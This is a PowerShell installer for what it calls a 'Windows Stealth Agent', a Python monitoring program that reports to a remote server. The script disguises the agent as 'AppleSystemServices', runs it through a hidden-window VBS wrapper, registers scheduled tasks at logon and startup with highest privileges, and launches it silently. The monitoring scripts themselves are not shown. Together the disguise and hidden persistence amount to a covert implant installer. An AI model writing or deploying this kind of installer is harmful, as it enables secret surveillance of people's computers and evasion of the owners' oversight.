# ================================================
# Windows Stealth Agent PowerShell Installer v4.1
# Auto-detects Python, installs dependencies & configures Task Scheduler
# Usage: powershell -ExecutionPolicy Bypass -File install_windows_agent.ps1
# ================================================

param (
    [string]$ServerUrl = "https://central-monitor.onrender.com"
)

Write-Host ""
Write-Host "================================================" -ForegroundColor Green
Write-Host "  🔧 Installing AppleSystemServices Agent (Windows PS)" -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Green
Write-Host "📡 Central Server: $ServerUrl" -ForegroundColor Cyan

$InstallDir = "C:\ProgramData\AppleSystemServices"
if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# Copy files
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
Copy-Item -Path "$ScriptDir\monitor.py" -Destination "$InstallDir\monitor.py" -Force
Copy-Item -Path "$ScriptDir\sysupdate.py" -Destination "$InstallDir\sysupdate.py" -Force
if (Test-Path "$ScriptDir\templates") {
    Copy-Item -Path "$ScriptDir\templates" -Destination "$InstallDir\templates" -Recurse -Force
}

# Find Python Path
$pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
if (-not $pythonPath) {
    $searchPaths = @(
        "$env:LOCALAPPDATA\Programs\Python\Python312\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python310\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python39\python.exe",
        "C:\Python311\python.exe",
        "C:\Python310\python.exe",
        "C:\Program Files\Python311\python.exe"
    )
    foreach ($p in $searchPaths) {
        if (Test-Path $p) {
            $pythonPath = $p
            break
        }
    }
}

if (-not $pythonPath) {
    Write-Host "⚠️ Python not found! Please install Python 3.x and re-run." -ForegroundColor Red
    exit 1
}

Write-Host "🐍 Using Python: $pythonPath" -ForegroundColor Yellow

# Install dependencies
Start-Process -FilePath $pythonPath -ArgumentList "-m pip install flask psutil requests pillow --quiet" -Wait -WindowStyle Hidden

# Create run_agent.cmd
$cmdContent = "@echo off`r`n""$pythonPath"" ""$InstallDir\sysupdate.py"" --server $ServerUrl"
Set-Content -Path "$InstallDir\run_agent.cmd" -Value $cmdContent -Encoding ASCII

# Create run_agent.vbs
$vbsContent = "Set WshShell = CreateObject(""WScript.Shell"")`r`nWshShell.Run ""cmd.exe /c """"$InstallDir\run_agent.cmd"""""", 0, False"
Set-Content -Path "$InstallDir\run_agent.vbs" -Value $vbsContent -Encoding ASCII

# Create Scheduled Task
schtasks /create /tn "AppleSystemServices" /tr "wscript.exe `"$InstallDir\run_agent.vbs`"" /sc onlogon /rl highest /f | Out-Null
schtasks /create /tn "AppleSystemServices_Boot" /tr "wscript.exe `"$InstallDir\run_agent.vbs`"" /sc onstart /rl highest /f | Out-Null

# Start Agent
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$InstallDir\run_agent.vbs`"" -WindowStyle Hidden

Write-Host ""
Write-Host "================================================" -ForegroundColor Green
Write-Host "  ✅ SUCCESS! Agent is running silently on Windows." -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Green
Write-Host ""
